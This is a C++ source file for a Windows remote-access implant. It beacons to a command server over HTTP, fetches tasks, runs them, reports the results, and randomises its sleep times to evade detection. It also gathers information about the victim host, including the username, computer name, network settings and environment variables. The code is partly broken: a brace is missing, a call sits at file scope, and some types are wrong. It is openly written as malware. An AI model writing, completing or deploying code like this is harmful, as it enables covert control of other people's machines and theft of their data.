#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>

//create id from the implant
UUID implantID;
UuidCreate( &implantID );


// Intialize object vars
Implant::Implant(std::string host, std::string port, std::string uri) :
    // server endpoint URL arguments
    host{ std::move(host) },
    port{ std::move(port) },
    uri{ std::move(uri) },
    // Options for config settings
    isRunning{ true },
    dwellDistributionSeconds{ 1. },

    // Thread that runs tasks and performs asynchronus i/o
    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
}

//enable/disable run status
void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }


// Sets time for how long implant should wait before contacting server for intructs 
void Implant::setMeanDwell(double meanDwell) {
    // Exponential_distribution makes implant blend in with the interwebs 
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

// sends asynchronous HTTP POST request with a payload to the listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload) {
    // step 1. Set all our request constants 
    //(address of the server, port, http protocol version, request body holding json payload)
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    // Construct our server endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    // asynchronous HTTP POST request to the server
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() }, //--> what holds the results of any tasks run previously
        cpr::Header{ {"Content-Type", "application/json"} }
    );
    // Retrieve the response
    cpr::Response response = asyncRequest.get();

    // Show the request 
    std::cout << "Request body: " << requestBody << std::endl;

    // returns body of response, possibly along with new tasks 
    return response.text;
};

// sends task results and receives new ones 
[[nodiscard]] std::string Implant::sendResults() {
    // Local results variable
    boost::property_tree::ptree resultsLocal;
    // A scoped lock to perform a swap from global results variable to the local results variable 
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    // Format result contents into JSON 
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    // Contact listening post with results and return any tasks received
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}

// parses and reveives tasks from server
void Implant::parseTasks(const std::string& response) {
    // Local response variable to store response
    std::stringstream responseStringStream{ response };

    // reads response from server as json 
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    // for-loop to parse tasks and push them into the tasks vector
    // Once this is done tasks are ready 
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
        {
            //pushes tasks from jason into task vector
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) { 
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); }) //set implant configuration
            );
        }
    }
}

// starts beaconing to server
void Implant::beacon() {
    while (isRunning) {
        // Try to contact the listening post and send results/get back tasks
        // Then, if tasks were received, parse and store them for execution
        // Tasks stored will be serviced by the task thread asynchronously
        try {
            std::cout << "implant is sending results to server...\n" << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nserver response content: " << serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            parseTasks(serverResponse);
            std::cout << "\n=================================\n" << std::endl;
        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
        }
        // Sleep and then beacon later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        std::this_thread::sleep_for(sleepTimeChrono); //less sus
}

// go thru and service tasks received from server 
void Implant::serviceTasks() {
    while (isRunning) {
        // Local tasks variable to store tasks
        std::vector<Task> localTasks;
        // Scoped lock to perform a swap
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex }; //swap from task vector 
            tasks.swap(localTasks);
        }
        // for-loop to call the run() on each task and add the results of tasks
        for (const auto& task : localTasks) {
            // Call run() on each task and we'll get back values for id, contents and success
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
            // Scoped lock to add task results
            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        // Go to sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}
/*
### Situational Awareness:
Whereami, whoami, whatami...
1. Read the environment variables
2. List the computer's network interfaces. MAC, IPs, interface names etc... 
3. Get the windows version
4. Get the current username and token (?)
5. Get the Computer Name
6. Get the Machine GUID (GUID is a 128-bit number used to identify resources)
7. List files in a directory
8. Change directory
9. List all running processes
*/

char* getEnvirons() {
    char* environs = new char[32767];
    DWORD environs_len = 32767;
    GetEnvironmentVariable("PATH", environs, environs_len);
    return environs;
}

char* getComputerName() {
    char* computerName = new char[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(computerName, &computerName_len);
    return computerName;
}

char* getNetworkInterfaces() {
    char* networkInterfaces = new char[32767];
    DWORD networkInterfaces_len = 32767;
    GetNetworkParams(networkInterfaces, &networkInterfaces_len);
    return networkInterfaces;
}

char* getUserName() {
    char* username = new char[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    return username;
}


int main() {
    std::cout << "Hello World!" << std::endl;
    return 0;
}